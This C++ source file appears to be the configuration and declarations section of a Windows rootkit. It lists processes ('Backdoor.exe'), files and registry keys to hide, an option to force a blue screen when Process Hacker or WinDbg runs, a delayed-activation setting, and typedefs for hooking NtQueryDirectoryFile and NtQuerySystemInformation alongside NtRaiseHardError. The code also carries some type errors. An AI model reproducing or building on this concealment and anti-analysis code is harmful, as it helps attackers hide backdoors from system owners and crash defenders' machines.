#include "includes.hpp"

const wchar_t* get_current_file_dir() {
    constexpr const char* file = __FILE__;
    const char* last_slash = file;
    for (const char* p = file; *p; ++p) {
        if (*p == '\\' || *p == '/') last_slash = p;
    }
    static wchar_t wdir[512]{};
    size_t len = last_slash - file;
    for (size_t i = 0; i < len; ++i) wdir[i] = file[i];
    wdir[len] = 0;
    return wdir;
}


//BSOD == BlueScreen
//USER CONFIGURATION HERE:

std::vector<const wchar_t *> BSODProcesses = {"processhacker.exe", "windbg.exe"}; //Processes that when running trigger a BSOD (can be ignored if BSOD == false)
std::atomic<bool> BSOD = false; //Enable Blue Screening when Processes from BSODProcesses
std::atomic<bool> E_HideProcesses = true; //Enable Process hiding
std::vector<const char *> HideProcesses = {"HideMe.exe", "Backdoor.exe"}; //Processes to hide
std::atomic<bool> E_HideFiles = true; //Enabling Hiding files
const std::vector<std::wstring> HideFiles = {L"C:\\HideMe.exe", L"C:\\Backdoor.exe", get_current_file_dir()}; //Files to hide and the Rootkits path (This can also be a Folder)
std::atomic<bool> E_HideKeys = true; //Enable Hiding Windows registry keys
std::vector<std::wstring> HIDE_REGS = {L"$$hide", L"WindowsSettingsManager" }; //The keys to hide
std::atomic<bool> DebugMode = false; //Show logs etc if activated
std::atomic<bool> DelayExcecution = false; //Delay the time it actually activates by how much you want. NOTE: This only delays excecution for the driver. It will still be loaded into the Kernel but wont act until the time is over and this will happen every restart so if you restart youll havr to wait again.
std::atomic<int> DelayTime = 7200; //Time to delay. NOTE: This time must be in seconds, the default time = 2 Hours. Use the converter to find out what the time you want is in seconds.


//USER CONFIG END;


//NTSTATUS STATUS_NO_MORE_ENTRIES= 0x8000001A;
//NTSTATUS STATUS_SUCCES = 0x00000000;
//CONSOLE DECLARATION HERE:
#ifndef CONSOLE_LOGGER_HPP
#define CONSOLE_LOGGER_HPP


enum class msg_type_t : std::uint32_t
{
	LNONE = 0,
	LDEBUG = 9,		/* blue */
	LSUCCESS = 10,	/* green */
	LERROR = 12,	/* red */
	LWARN = 14		/* yellow */
};

inline std::ostream& operator<< (std::ostream& os, const msg_type_t type)
{
	switch (type)
	{
	case msg_type_t::LDEBUG:	return os << ".";
	case msg_type_t::LSUCCESS:	return os << "+";
	case msg_type_t::LERROR:	return os << "!";
	case msg_type_t::LWARN:		return os << "*";
	default: return os << "";
	}
}

class logger
{
private:
	std::shared_timed_mutex mutex;

public:
	logger(const std::wstring_view title_name = {})
	{
		AllocConsole();
		AttachConsole(GetCurrentProcessId());

		if (!title_name.empty())
			SetConsoleTitle(title_name.data());

		FILE* conin, * conout;

		freopen_s(&conin, "conin$", "r", stdin);
		freopen_s(&conout, "conout$", "w", stdout);
		freopen_s(&conout, "conout$", "w", stderr);
	}

	~logger()
	{
		const auto handle = FindWindow(L"ConsoleWindowClass", nullptr);
		ShowWindow(handle, SW_HIDE);
		FreeConsole();
	}

	template< typename ... arg >
	void print(const msg_type_t type, const std::string_view& func, const std::string& format, arg ... a)
	{
		static auto* h_console = GetStdHandle(STD_OUTPUT_HANDLE);
		std::unique_lock<decltype(mutex)> lock(mutex);

		const size_t size = (size_t)(1) + std::snprintf(nullptr, 0, format.c_str(), a ...);
		const std::unique_ptr<char[]> buf(new char[size]);
		std::snprintf(buf.get(), size, format.c_str(), a ...);
		const auto formated = std::string(buf.get(), buf.get() + size - 1);

		if (type != msg_type_t::LNONE)
		{
			SetConsoleTextAttribute(h_console, (WORD)(type));
			std::cout << "[";
			std::cout << type;
			std::cout << "] ";

			SetConsoleTextAttribute(h_console, 15 /* white */);
			std::cout << "[ ";

			SetConsoleTextAttribute(h_console, (WORD)(type));
			std::cout << func;

			SetConsoleTextAttribute(h_console, 15 /* white */);
			std::cout << " ] ";
		}

		if (type == msg_type_t::LDEBUG)
			SetConsoleTextAttribute(h_console, 8 /* gray */);
		else
			SetConsoleTextAttribute(h_console, 15 /* white */);

		std::cout << formated << "\n";
	}
};

//#ifdef DebugMode

inline auto g_logger = logger(L"");


#define log_debug(...)   do { if (DebugMode) g_logger.print(msg_type_t::LDEBUG, __FUNCTION__, __VA_ARGS__); } while(0)
#define log_ok(...)      g_logger.print(msg_type_t::LSUCCESS, __FUNCTION__, __VA_ARGS__)
#define log_err(...)     g_logger.print(msg_type_t::LERROR, __FUNCTION__, __VA_ARGS__)
#define log_warn(...)    g_logger.print(msg_type_t::LWARN, __FUNCTION__, __VA_ARGS__)
#define log_raw(...)     g_logger.print(msg_type_t::LNONE, __FUNCTION__, __VA_ARGS__)
//#else
//#define log_debug(...)
//#define log_ok(...)
//#define log_err(...)
//#define log_warn(...)
//#define log_raw(...)
//#endif

#endif // guard

typedef struct _VM_COUNTERS
{
    SIZE_T PeakVirtualSize;             // The peak virtual address space size of this process, in bytes.
    SIZE_T VirtualSize;                 // The virtual address space size of this process, in bytes.
    ULONG PageFaultCount;               // The number of page faults.
    SIZE_T PeakWorkingSetSize;          // The peak working set size, in bytes.
    SIZE_T WorkingSetSize;              // The current working set size, in bytes
    SIZE_T QuotaPeakPagedPoolUsage;     // The peak paged pool usage, in bytes.
    SIZE_T QuotaPagedPoolUsage;         // The current paged pool usage, in bytes.
    SIZE_T QuotaPeakNonPagedPoolUsage;  // The peak non-paged pool usage, in bytes.
    SIZE_T QuotaNonPagedPoolUsage;      // The current non-paged pool usage, in bytes.
    SIZE_T PagefileUsage;               // The Commit Charge value in bytes for this process. Commit Charge is the total amount of private memory that the memory manager has committed for a running process.
    SIZE_T PeakPagefileUsage;           // The peak value in bytes of the Commit Charge during the lifetime of this process.
} VM_COUNTERS, *PVM_COUNTERS;

typedef enum _KWAIT_REASON
{
	Executive = 0,
	FreePage = 1,
	PageIn = 2,
	PoolAllocation = 3,
	DelayExecution = 4,
	Suspended = 5,
	UserRequest = 6,
	WrExecutive = 7,
	WrFreePage = 8,
	WrPageIn = 9,
	WrPoolAllocation = 10,
	WrDelayExecution = 11,
	WrSuspended = 12,
	WrUserRequest = 13,
	WrEventPair = 14,
	WrQueue = 15,
	WrLpcReceive = 16,
	WrLpcReply = 17,
	WrVirtualMemory = 18,
	WrPageOut = 19,
	WrRendezvous = 20,
	Spare2 = 21,
	Spare3 = 22,
	Spare4 = 23,
	Spare5 = 24,
	WrCalloutStack = 25,
	WrKernel = 26,
	WrResource = 27,
	WrPushLock = 28,
	WrMutex = 29,
	WrQuantumEnd = 30,
	WrDispatchInt = 31,
	WrPreempted = 32,
	WrYieldExecution = 33,
	WrFastMutex = 34,
	WrGuardedMutex = 35,
	WrRundown = 36,
	MaximumWaitReason = 37
} KWAIT_REASON;


typedef LONG       KPRIORITY;

typedef struct _CLIENT_ID {
	DWORD          UniqueProcess;
	DWORD          UniqueThread;
} CLIENT_ID;



typedef struct _SYSTEM_THREAD {



  LARGE_INTEGER           KernelTime;
  LARGE_INTEGER           UserTime;
  LARGE_INTEGER           CreateTime;
  ULONG                   WaitTime;
  PVOID                   StartAddress;
  CLIENT_ID               ClientId;
  KPRIORITY               Priority;
  LONG                    BasePriority;
  ULONG                   ContextSwitchCount;
  ULONG                   State;
  KWAIT_REASON            WaitReason;

} SYSTEM_THREAD, *PSYSTEM_THREAD;


NTSYSAPI NTSTATUS ZwLoadDriver(
  [in] PUNICODE_STRING DriverServiceName
);

NTSYSAPI NTSTATUS ZwUnloadDriver(
  [in] PUNICODE_STRING DriverServiceName
);


typedef struct _SYSTEM_PROCESS_INFORMATION {



    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    KPRIORITY               BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessid;
    ULONG                   HandleCount;
    ULONG                   Reserved2[2];
    ULONG                   PrivatePageCount;
    VM_COUNTERS             VirtualMemoryCounters;
    IO_COUNTERS             IoCounters;
    SYSTEM_THREAD           Thread[0];
} SYSTEM_PROCESS_INFORMATION, *PSSYSTEM_PROCESS_INFORMATION;



typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI* pNtQueryDirectoryFile)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
);


typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG         NextEntryOffset;
  ULONG         FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG         FileAttributes;
  ULONG         FileNameLength;
  WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

pNtQueryDirectoryFile NtQueryDirectoryFile = nullptr;
pNtQueryDirectoryFile OriginalNtQueryDirectoryFile = nullptr;
NtQuerySystemInformation_t OriginalNtQuerySystemInformation = nullptr;

//NTSYSAPI 
//NTSTATUS
//NTAPI

typedef enum _KEY_INFORMATION_CLASS {
  KeyBasicInformation,
  KeyNodeInformation,
  KeyFullInformation,
  KeyNameInformation,
  KeyCachedInformation,
  KeyFlagsInformation,
  KeyVirtualizationInformation,
  KeyHandleTagsInformation,
  KeyTrustInformation,
  KeyLayerInformation,
  MaxKeyInfoClass
} KEY_INFORMATION_CLASS;


typedef enum _KEY_VALUE_INFORMATION_CLASS {
  KeyValueBasicInformation,
  KeyValueFullInformation,
  KeyValuePartialInformation,
  KeyValueFullInformationAlign64,
  KeyValuePartialInformationAlign64,
  KeyValueLayerInformation,
  MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;


typedef NTSTATUS (NTAPI* NtEnumerateValueKey_t)(

  IN HANDLE               KeyHandle,
  IN ULONG                Index,
  IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  OUT PVOID               KeyValueInformation,
  IN ULONG                Length,
  OUT PULONG              ResultLength );

typedef NTSTATUS (NTAPI* NtEnumerateKey_t)(



  IN HANDLE               KeyHandle,
  IN ULONG                Index,
  IN KEY_INFORMATION_CLASS KeyInformationClass,
  OUT PVOID               KeyInformation,
  IN ULONG                Length,
  OUT PULONG              ResultLength 
);

typedef struct _KEY_NAME_INFORMATION {
  ULONG NameLength;
  WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG         TitleIndex;
  ULONG         NameLength;
  WCHAR         Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG DataOffset;
  ULONG DataLength;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
